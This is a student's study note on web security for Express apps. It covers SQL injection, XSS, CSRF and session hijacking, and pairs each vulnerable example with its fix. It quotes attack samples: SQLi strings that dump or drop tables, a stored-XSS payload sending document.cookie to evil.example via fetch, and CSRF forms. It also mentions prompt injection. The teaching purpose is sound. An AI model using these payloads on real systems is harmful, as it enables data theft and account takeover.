# Web Security I — Injection, XSS, CSRF & Session Hijacking

**Created Date:** 2026-10-10
**Last Updated:** 2026-10-10
**Tags:** `#Security`, `#OWASP`, `#SQLInjection`, `#XSS`, `#CSRF`, `#SessionHijacking`, `#Express`, `#Knex`, `#EJS`, `#Handlebars`
**References:** [OWASP Top 10 — 2021](https://owasp.org/Top10/) · [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) · [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) · [OWASP — CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) · [OWASP — Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) · [PortSwigger Web Security Academy](https://portswigger.net/web-security) · [Node.js — Security Best Practices](https://nodejs.org/en/learn/getting-started/security-best-practices) · MDN — "SameSite cookies", "Content-Security-Policy"
**Status:** Draft
**Difficulty:** Intermediate
**Template:** A (Tech Note)
**Prerequisites:** [`../web_server/05-template-engines-handlebars-ejs-layout.md`](../web_server/05-template-engines-handlebars-ejs-layout.md) (escaping, `{{{ }}}` vs `{{ }}`), [`../web_server/06-sessions-cookies-localstorage.md`](../web_server/06-sessions-cookies-localstorage.md) (cookies, `HttpOnly`, `SameSite`), [`../web_server/07-authentication-signup-signin-signout.md`](../web_server/07-authentication-signup-signin-signout.md) (sessions, login flow), [`../databases/06-knex-query-builder-and-crud.md`](../databases/06-knex-query-builder-and-crud.md) (parameter binding)

---

## 📌 Key Takeaways (TL;DR)

- **Security is a property of the whole system, not a library you install.** Every request crosses a *trust boundary* — the network is untrusted by default — and every byte that crosses it is attacker-controlled until proven otherwise.
- **The core mantra: validate input, escape output, minimize privilege.** Input validation *rejects* malformed data at the door; output encoding *neutralises* data in the context where it will be interpreted; least privilege *caps the blast radius* when both fail.
- **Injection (SQL, template, DOM) is one bug repeated in different languages:** untrusted data is concatenated into a string that a parser later re-parses. The fix is always the same shape — **keep data and code separate** (bind parameters, encode output, use `textContent`).
- **The three XSS types differ only in where the payload is stored and when it fires:** reflected (bounces off a response), stored (persisted in your DB), DOM (never touches the server — it is assembled in the browser).
- **CSRF weaponises the browser's automatic cookie attachment.** SameSite + a per-request token + a custom-header requirement are the trinity; each covers a gap the others miss.
- **Session hijacking and fixation are two faces of one problem: the session id is the password.** Protect it (`HttpOnly`, `Secure`, `SameSite`), regenerate it on login, and rotate it on privilege change.

---

## 🧠 Detailed Notes

### 1. Core Concepts — why security is an architecture, not a checkbox

#### 1.1 The trust boundary

A **trust boundary** is any line where data moves from a less-trusted zone to a more-trusted one. For an Express app there are three important ones:

```
                     TRUST BOUNDARY DIAGRAM
  ┌───────────────────────────────────────────────────────────────┐
  │  UNTRUSTED (the internet)                                       │
  │    browser · curl · botnet · attacker's laptop                  │
  └───────────────┬───────────────────────────────────────────────┘
                  │  HTTP request: query, params, body, headers, cookies
     ┌────────────▼────────────┐   ← TRUST BOUNDARY #1 (input)
     │  YOUR SERVER (Express)   │
     │   • validation           │
     │   • authN / authZ        │
     └────────────┬────────────┘
                  │  SQL, file paths, shell args, template data
     ┌────────────▼────────────┐   ← TRUST BOUNDARY #2 (storage/OS)
     │  PostgreSQL / filesystem │
     └──────────────────────────┘
                  │  HTML response
     ┌────────────▼────────────┐   ← TRUST BOUNDARY #3 (output)
     │  The user's browser      │
     └──────────────────────────┘
```

The attacker sends data **across a boundary you do not control**. Every one of the attacks in this note is the same move: put *data* where the receiving system will treat it as *instructions*. SQL injection does it to the database; XSS does it to the browser; CSRF does it with your own server as the confused deputy.

**Three concepts organise every defence:**

| Concept | Question it answers | Example control |
|---|---|---|
| **Trust boundary** | Who can send what into this system? | Treat all of `req.query/body/params` as hostile |
| **Input vs output context** | Where does this value get interpreted? | Validate as JSON; encode as HTML attribute |
| **Least privilege** | What is the worst case if this fails? | DB role that can only `SELECT`/`INSERT`, not `DROP` |

#### 1.2 Validate input, escape output, minimize privilege

The single most useful phrase in web security:

```
   VALIDATE INPUT      →      ESCAPE OUTPUT       →      MINIMIZE PRIVILEGE
   ───────────────            ─────────────              ─────────────────
   reject bad shapes          neutralise data            cap the damage
   at the boundary            in its real context        if the above fail

   "id must be a UUID"        "this string is HTML,       DB user has only the
                              so encode <, >, &, \""       rights this feature needs
```

- **Validate input** at the boundary: an `id` must match `^\d+$`; a `sort` field must be one of a known allow-list; a body must match a schema. This kills whole classes of bugs early and gives clean errors.
- **Escape output** for the *destination*: HTML body, HTML attribute, JavaScript string, URL, and SQL are five different contexts. Encoding for one is wrong for another — context is the whole game.
- **Minimize privilege** so a mistake is survivable: the query that reads posts should run as a role with no `DELETE` right; the Node process should not be `root`; the upload directory should not be executable.

#### 1.3 The OWASP Top 10 as the course map

OWASP's Top 10 (2021) is the industry's shared vocabulary for ranking risk. Ranked, with the ones this chapter touches marked:

| Rank | Category | In this chapter? |
|---|---|---|
| A01 | Broken Access Control | → [`02`](./02-authorization-and-dos-defense.md) (#1 risk) |
| A02 | Cryptographic Failures | *`web_server/07` (bcrypt), `06` (HTTPS cookies)* |
| A03 | **Injection** | ✅ §2, §3 of this note |
| A04 | Insecure Design | ✅ §1 (this is an architecture chapter) |
| A05 | Security Misconfiguration | ✅ §3 (CSP, headers), `02` (default-allow) |
| A06 | Vulnerable & Outdated Components | *not covered yet* |
| A07 | Identification & Authentication Failures | → `web_server/07`, §5 here |
| A08 | Software & Data Integrity Failures | *not covered yet* |
| A09 | Security Logging & Monitoring Failures | → [`02`](./02-authorization-and-dos-defense.md) §6 |
| A10 | Server-Side Request Forgery (SSRF) | *[SUGGESTED]* |

**Why the ranking matters:** OWASP orders by observed real-world frequency and impact, not by how "interesting" a bug is. Injection stays high because it is *cheap to prevent and still widely present* — the gap is discipline, not knowledge.

---

### 2. SQL Injection — the prototype injection bug

#### 2.1 Root cause: concatenating data into code

SQL injection happens when user input is placed into a SQL string *before* that string is parsed. The database cannot tell the attacker's `' OR 1=1 --` from the developer's `'Smith'` — both arrive as text in one statement.

**The vulnerable pattern (Express + Knex `raw`):**

```js
// ❌ VULNERABLE — template literal builds SQL from user input
app.get("/search", async (req, res) => {
  const q = req.query.q;                       // attacker-controlled
  const sql = `SELECT * FROM posts WHERE title = '${q}'`;
  const result = await db.raw(sql);            // the DB re-parses attacker text
  res.render("search", { rows: result.rows });
});
```

Send `?q=' OR 1=1 --`. The server assembles:

```sql
SELECT * FROM posts WHERE title = '' OR 1=1 --'
                              ▲        ▲      ▲
                     closes the   always   comments out
                     string       true     the trailing quote
```

Result: **every post is returned.** Reach further — `?q=' UNION SELECT email, password_hash FROM users --` — and a search box leaks the user table. With `'; DROP TABLE posts; --` on a role that has DDL rights, it is data loss.

```
   WHAT THE DEVELOPER MEANT          WHAT THE DATABASE SAW
   ────────────────────────          ─────────────────────
   title = '<the value of q>'        title = ''  OR  1=1  -- '
                                     └──── data ────┘└─ code ─┘  ← blurred
```

#### 2.2 The fix: parameters are never re-parsed

A **parameterised query** (prepared statement) sends the *structure* to the database first, then the *values* separately over the wire protocol. The database compiles the query with holes (`$1`), and values can only ever fill a value slot — they are never scanned for keywords.

**The fixed pair:**

```js
// ✅ SAFE — Knex binds every value as a parameter
const rows = await db("posts").where({ title: req.query.q });

// ✅ SAFE — explicit binding when you truly need raw SQL
const result = await db.raw("SELECT * FROM posts WHERE title = ?", [req.query.q]);

// ✅ SAFE — whereRaw with bindings (never a template literal)
const result = await db("posts").whereRaw("title ILIKE ?", [`%${q}%`]);
```

The compiled statement is always `... WHERE title = $1`, transmitted with `[$1 => "' OR 1=1 --"]`. Postgres treats the whole string as a *value*; `1=1` never becomes a predicate. This is the same mechanism behind `databases/06`'s central claim — the query builder does not "escape" your input, it never lets input become syntax. [→ `../databases/06-knex-query-builder-and-crud.md`](../databases/06-knex-query-builder-and-crud.md)

**The ORM is not a magic shield.** An ORM protects you *only* along its own API. The moment you write `db.raw("... ${x} ...")` or `whereRaw("name = '" + x + "'")`, you are back at square one. Most real-world SQLi in 2020s codebases is exactly this: a raw escape hatch used for convenience.

#### 2.3 Secondary defence: least privilege and detection

- **Least privilege:** the app's DB role should not own the tables. Grant `SELECT, INSERT, UPDATE, DELETE` on the tables it uses — never `DROP`, `ALTER`, or `SUPERUSER`. Then even a successful `DROP TABLE` injection fails with a permission error instead of destroying data. This is defence-in-depth: the bug still exists, the impact collapses.
- **Detection:** run `EXPLAIN` on the query while injecting a payload. A consonant-looking query that suddenly shows a `Seq Scan` over `users` with no `WHERE` filter is the footprint of `OR 1=1`. Log and alert on statements that reference tables no route should touch.
- **Why it matters:** this is the exam question *and* the bug that keeps appearing at the top of breach reports. The fix is one line (`where({ ... })`); the discipline is never taking the raw escape hatch for user data. Every API I ship inherits this hygiene.

---

### 3. Cross-Site Scripting (XSS) — injection aimed at the browser

XSS is SQL injection's cousin: untrusted data is concatenated into an HTML/JS *string*, and the **browser** re-parses it as code. The three types differ by *where the payload lives*:

| Type | Payload stored where? | Fires when? | Typical entry |
|---|---|---|---|
| **Reflected** | nowhere — echoed back in one response | immediately, in the victim's request | query param rendered into the page |
| **Stored** | persisted in your DB | every time anyone views the page | comment, profile bio, WYSIWYG post |
| **DOM** | in the URL/`localStorage`/JSON | client JS writes it into the DOM | `innerHTML = location.hash` |

#### 3.1 The course-specific gotcha: templates are safe only with *encoded* output

Server-rendered templates (Handlebars, EJS) are the default XSS defence — **if** you use the escaping syntax. The raw syntax disables it:

| Engine | Escaped (safe) | Raw (dangerous) | Meaning |
|---|---|---|---|
| Handlebars | `{{ userBio }}` | `{{{ userBio }}}` | raw = no HTML encoding |
| EJS | `<%= userBio %>` | `<%- userBio %>` | raw = no HTML encoding |

The raw form exists for *trusted* partials, not user content. Use it on user input and you have hand-built an XSS. [→ `../web_server/05-template-engines-handlebars-ejs-layout.md`](../web_server/05-template-engines-handlebars-ejs-layout.md)

#### 3.2 A payload walkthrough — escaping the context

Consider a template that puts a bio inside a `<textarea>` using raw output:

```hbs
<!-- ❌ VULNERABLE — userBio is not encoded -->
<textarea name="bio">{{{ userBio }}}</textarea>
```

The attacker sets their bio to:

```html
</textarea><script>fetch('//evil.example/?c=' + document.cookie)</script>
```

The browser renders:

```html
<textarea name="bio"></textarea>
<script>fetch('//evil.example/?c=' + document.cookie)</script>
```

The `</textarea>` **closes the element early**, so the `<script>` is no longer text inside a textarea — it is a live script in the page. It fires for *every* visitor (this is **stored** XSS) and exfiltrates the session cookie. If the cookie is not `HttpOnly`, the attacker now has a valid login. This is why `HttpOnly` and output encoding are complementary: `HttpOnly` blocks the theft, encoding blocks the injection.

#### 3.3 Reflected and DOM XSS

**Reflected:** the server places the query param straight into the page.

```js
// ❌ VULNERABLE
app.get("/hello", (req, res) => res.send(`<h1>Hello ${req.query.name}</h1>`));
// ?name=<img src=x onerror=alert(1)>  → the img loads, fails, runs onerror
```

**DOM XSS:** the payload never reaches the server; the browser's own JS assembles it.

```js
// ❌ VULNERABLE — user data handed to the HTML parser
document.getElementById("out").innerHTML = location.hash.slice(1);
// #<img src=x onerror=alert(1)>

// ✅ SAFE — textContent never parses HTML
document.getElementById("out").textContent = location.hash.slice(1);
```

The fix here lives in the client layer; the full DOM model is in [`../web_basics/05-dom-and-browser-event-loop.md`](../web_basics/05-dom-and-browser-event-loop.md). The rule is absolute: **user data goes through `textContent`, never `innerHTML`.**

#### 3.4 The defence stack (layered)

No single control is enough; stack them so each covers a gap:

1. **Output encoding by default** — use escaped template syntax; never raw on user content. This is the primary control.
2. **Content-Security-Policy (CSP)** — a response header that tells the browser *which* scripts may run. A strict policy (`script-src 'self'`) blocks inline `<script>` even if an injection slips through.
   ```js
   app.use((req, res, next) => {
     res.setHeader("Content-Security-Policy",
       "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'");
     next();
   });
   ```
3. **Sanitise on write for rich content** — a WYSIWYG editor legitimately produces HTML, so you must clean it with an allow-list sanitiser (`sanitize-html`) before storing. [→ `../web_server/08-advanced-features-pagination-wysiwyg-upload.md`](../web_server/08-advanced-features-pagination-wysiwyg-upload.md)
4. **`HttpOnly` cookies** — the last line: even if a script runs, it cannot read the session cookie. [→ `../web_server/06-sessions-cookies-localstorage.md`](../web_server/06-sessions-cookies-localstorage.md)

**Why it matters:** XSS is an account-takeover primitive, not a popup. It defeats CSRF tokens (the script can read the token from the page), steals sessions, and rewrites the UI to phish. The course's WYSIWYG feature is a live XSS gun if sanitisation is skipped.

---

### 4. CSRF — making the victim's browser attack itself

#### 4.1 Why it works: cookies travel automatically

A session cookie is attached by the browser to *every* request to your domain — **including requests triggered by another site**. The browser cannot tell a form the user intended to submit from one an attacker script submitted. The server sees a valid cookie and a valid request.

```
   CROSS-SITE REQUEST FORGERY
   1. Victim logs into bank.example  →  browser stores  session=abc123
   2. Victim visits evil.example     →  page contains:
        <form action="https://bank.example/posts/delete" method="POST">
          <input type="hidden" name="id" value="42">
        </form>
        <script>document.forms[0].submit()</script>
   3. Browser POSTs to bank.example  →  session=abc123 attached AUTOMATICALLY
   4. bank.example sees a valid session  →  deletes post 42
```

A GET variant needs no script at all — a bare `<img src="https://bank.example/profile/change-email?to=evil@x">` triggers a state-changing GET the moment the page loads.

#### 4.2 The defence trinity

| Control | What it proves | When it is not enough |
|---|---|---|
| **CSRF token** | the request came from a page *you* rendered | leaks via XSS; must be per-session, unpredictable |
| **`SameSite=Lax/Strict`** | cookie is not sent on cross-site requests | older browsers; explicit cross-site flows need `None` |
| **Custom-header requirement** | a plain HTML form *cannot* set custom headers | not applicable to form posts; works for `fetch`/AJAX |

**The token flow (the one the exam wants):**

```
  SERVER                                        CLIENT (browser)
  ──────                                        ────────────────
  1. render form
     token = random per-session value
     store token in session ──────────────►     <input type="hidden"
                                                   name="_csrf" value="T">
  2. user submits form  ◄──────────────────────  POST /posts/delete
                                                   _csrf=T  (+ cookie)
  3. compare body._csrf === session.token
        match  → proceed                        (attacker cannot read T:
        mismatch → 403                           it is in the victim's HTML,
                                                 not in evil.example's)
```

```js
// Typical Express + express-session setup (double-submit / synchroniser pattern)
const csrf = require("csurf");
app.use(csrf({ cookie: false }));              // store token in the session
app.use((req, res, next) => {                  // expose token to every view
  res.locals.csrfToken = req.csrfToken();
  next();
});

// In the EJS/Handlebars form:
// <input type="hidden" name="_csrf" value="{{ csrfToken }}">
```

**When SameSite alone is insufficient:** a top-level GET navigation is still "same-site" under `Lax`, so **any state-changing GET is unprotected** (never change state on GET). Cross-site cookies with `SameSite=None` (needed for some OAuth/embed flows) reopen the door. And a token stored in a cookie without server-side comparison ("double-submit" done carelessly) fails if XSS or a subdomain can set cookies. That is why the trinity is a trinity — the token is the load-bearing one.

**Why it matters:** CSRF turns *your logged-in users* into the attacker's proxy. It cannot be fixed by hiding buttons or checking the `Referer` alone; it needs a server-side secret the attacker cannot obtain.

---

### 5. Session Hijacking & Fixation — stealing the key

The session cookie *is* the credential — possessing it is being logged in. Two attacks target it:

**Session hijacking = stealing a live session id.**

```
   VECTORS                                  FIX
   ───────                                  ───
   XSS reads document.cookie    ──────►     HttpOnly  (JS can't read it)
   Sniffing on plain HTTP       ──────►     Secure    (cookie only over HTTPS)
   Leaked via Referer header    ──────►     Referrer-Policy: no-referrer
   Logged in access logs        ──────►     don't log cookies; short TTL
   Sent on cross-site request   ──────►     SameSite=Lax/Strict
```

**Session fixation = the attacker *chooses* the id before login.**

```
   SESSION FIXATION
   1. Attacker gets a session id from the server:  sid=KNOWN
   2. Attacker tricks victim into using sid=KNOWN
        (link with ?sid=KNOWN, or a cookie set via a subdomain)
   3. Victim logs in  →  server marks sid=KNOWN as authenticated
   4. Attacker reuses sid=KNOWN  →  is now the victim
```

**The fix is a one-liner in the login handler** — regenerate the id at the privilege boundary:

```js
app.post("/signin", async (req, res) => {
  // ... verify password ...
  req.session.regenerate((err) => {          // ✅ new id after authN
    if (err) return res.status(500).send("error");
    req.session.userId = user.id;            // identity attached to NEW id
    req.session.save(() => res.redirect("/dashboard"));
  });
});
```

**Defence checklist:**

- [ ] `HttpOnly` — blocks XSS cookie theft.
- [ ] `Secure` — cookie only travels over HTTPS.
- [ ] `SameSite=Lax` (or `Strict`) — blocks CSRF-era cross-site sending.
- [ ] **Regenerate the id on login** and on privilege change (fixation).
- [ ] Rotate the session secret periodically; never commit it.
- [ ] Short TTL + idle timeout; **destroy the server record on logout** (not just clear the cookie).
- [ ] Store sessions server-side (the course uses `connect-session-knex`), so revocation is instant.

[→ `../web_server/06-sessions-cookies-localstorage.md`](../web_server/06-sessions-cookies-localstorage.md) · [→ `../web_server/07-authentication-signup-signin-signout.md`](../web_server/07-authentication-signup-signin-signout.md)

**Why it matters:** a fixed or leaked session id is complete account takeover with no password. The regeneration-on-login step is the single most-missed line in student projects — and one the course (5.4) explicitly tests.

---

### 6. Input validation — the front gate

Validation happens *before* anything else and rejects malformed requests early. The course uses two complementary styles:

```js
// (a) Schema validation for a body (zod-like, or Joi/express-validator)
const schema = z.object({
  title: z.string().trim().min(1).max(200),
  body:  z.string().trim().min(1).max(10_000),
});
const parsed = schema.safeParse(req.body);
if (!parsed.success) return res.status(400).render("error", { errors: parsed.error.issues });
```

```js
// (b) Function validation for a param (allow-list the sort column!)
const SORTABLE = ["created_at", "title", "likes"];      // allow-list, not deny-list
app.get("/posts", async (req, res) => {
  const sort = SORTABLE.includes(req.query.sort) ? req.query.sort : "created_at";
  const rows = await db("posts").orderBy(sort, "desc")   // safe: value from a closed set
                   .limit(Number(req.query.limit) || 20);
});
```

Four principles:

- **Allow-list before deny-list.** Define what *is* valid; reject everything else. Deny-lists always miss a variant.
- **Size limits everywhere.** `express.json({ limit: "100kb" })`, a max length per field, a max upload size via `multer`. Unbounded input is a DoS vector (see `02`). [→ `../web_server/08-advanced-features-pagination-wysiwyg-upload.md`](../web_server/08-advanced-features-pagination-wysiwyg-upload.md)
- **Normalise** — `trim()`, lower-case emails, collapse whitespace — *then* validate, so `" admin "` cannot slip past a role check.
- **Validate types, not just presence.** `NaN` from `Number("abc")` silently becomes a query value; check it.

[→ `../web_server/04-routing-in-express.md`](../web_server/04-routing-in-express.md)

#### 6.1 The defence checklist table (exam revision)

| Attack | Entry point | Primary defence | Where already covered |
|---|---|---|---|
| SQL injection | `req.query/params/body` → SQL | parameter binding; least-privileged DB role | §2; `databases/06` |
| Reflected XSS | query param → HTML | HTML-encode output | §3; `web_server/05` |
| Stored XSS | DB field → HTML | encode output + sanitise on write | §3; `web_server/05`, `08` |
| DOM XSS | URL/storage → `innerHTML` | `textContent`; CSP | §3; `web_basics/05` |
| CSRF | cross-site auto-cookie request | token + `SameSite` + custom header | §4; `web_server/06` |
| Session hijacking | stolen session cookie | `HttpOnly` + `Secure` + short TTL | §5; `web_server/06` |
| Session fixation | attacker-chosen id | regenerate id on login | §5; `web_server/07` |
| Invalid input | any boundary | schema + allow-list + size caps | §6; `web_server/04`, `08` |

**Why it matters (the big one):** this is exam-critical *and* it is the hygiene every API I ever ship inherits. As an AI Engineer building Gen-AI products, a new cousin appears: **prompt injection** — untrusted text (a user message, a scraped web page) concatenated into an LLM prompt, where the model re-parses it as instructions. It is structurally identical to SQL injection; the parser is just a language model. The same mantra applies: keep instructions and data separate, validate inputs, minimise the tools the model may call. [→ `../../ai_ml/README.md`](../../ai_ml/README.md)

---

## 🔗 Tech Cross-References

- **Security ↔ Database (Knex/SQL)** — parameter binding is the *same* control that makes the query builder safe; SQLi is what happens when the raw escape hatch is used. [`../databases/06-knex-query-builder-and-crud.md`](../databases/06-knex-query-builder-and-crud.md)
- **Security ↔ Template engines** — encoded vs raw output (`{{ }}` vs `{{{ }}}`, `<%= %>` vs `<%- %>`) is the default XSS boundary; `web_server/05` is where the encoding actually happens. [`../web_server/05-template-engines-handlebars-ejs-layout.md`](../web_server/05-template-engines-handlebars-ejs-layout.md)
- **Security ↔ Sessions/Cookies** — `HttpOnly`, `Secure`, and `SameSite` are cookie attributes set at the session layer, and they are load-bearing for both XSS and CSRF. [`../web_server/06-sessions-cookies-localstorage.md`](../web_server/06-sessions-cookies-localstorage.md)
- **Security ↔ DOM/JavaScript** — DOM XSS is created by `innerHTML` in the browser, with no server involvement; the fix is `textContent`. [`../web_basics/05-dom-and-browser-event-loop.md`](../web_basics/05-dom-and-browser-event-loop.md)

## 📝 Research Journey

- **Why:** Security was the one chapter I kept deferring, because it felt like a list of scary acronyms with no thread connecting them. I wanted the *thread* — the one mental move behind all of them — so that I could stop memorising payloads and start reasoning about where data gets re-parsed.
- **Struggle:** The hardest jump was realising that the template engine I trusted in `web_server/05` becomes an XSS engine the moment I write `{{{ }}}`. I had treated "using a template engine" as the security control; it is not — *using the escaped syntax* is. That reframing took the longest.
- **Aha moment:** Seeing SQL injection and XSS as literally the same bug ("data becomes code at a parse step") collapsed two chapters into one idea. The `</textarea><script>` payload made it physical: the closing tag escapes the data context and re-enters the code context, exactly like the `'` in `' OR 1=1 --` re-enters the SQL context.
- **Career link:** My target is AI Engineer in Economics/Business, where the product is frequently an LLM pipeline that ingests untrusted text. Prompt injection is the same trust-boundary failure with a language model as the parser, and it will be the AI analogue of the bugs in this note. Learning to think in "trust boundary → parser → injection" now is what lets me build agent systems later that do not hand an attacker the keys.

## 🔗 Related Topics

- [`./02-authorization-and-dos-defense.md`](./02-authorization-and-dos-defense.md) — the other half of the security chapter (who may do what; resource exhaustion).
- [`../web_server/07-authentication-signup-signin-signout.md`](../web_server/07-authentication-signup-signin-signout.md) — the login flow whose session id this note protects.
- [`../databases/06-knex-query-builder-and-crud.md`](../databases/06-knex-query-builder-and-crud.md) — parameter binding, the concrete SQLi defence.
- [SUGGESTED] `../../ai_ml/08-prompt-injection-and-llm-trust-boundaries.md` — a dedicated note treating prompt injection as the LLM-era continuation of this chapter (untrusted text → parser → instruction execution).
- [SUGGESTED] `03-content-security-policy-deep-dive.md` — CSP is introduced in one paragraph here; it deserves a full note (directives, nonces, `report-uri`, deployment with Helmet).
- [SUGGESTED] `04-ssrf-and-server-side-request-forgery.md` — OWASP A10; the server made to fetch an attacker-chosen URL, a cousin of injection in the outbound direction.

## 🤔 Open Questions

- [ ] If I use a strict CSP with a per-response nonce, does that fully replace output encoding, or are they still complementary? (CSP is a safety net, not a substitute — but what exact gap remains?)
- [ ] With `SameSite=Lax` default in modern browsers, which CSRF cases still require a token — top-level GET, `SameSite=None` OAuth flows, and non-browser clients?
- [ ] How do I detect a **stored** XSS payload that was written *before* I added `sanitize-html`? Do I need a one-time migration to cleanse existing rows?
- [ ] For an LLM feature, where exactly is the trust boundary between "user message as data" and "user message as instructions" — and can any encoding honestly enforce it?
- [ ] `express-session` with a DB store: what is a sane idle timeout and absolute TTL balance between security and UX friction?

---
*Injection is one bug wearing different costumes. Find the parser, draw the trust boundary, and keep data out of the code slot — the rest is repetition.*
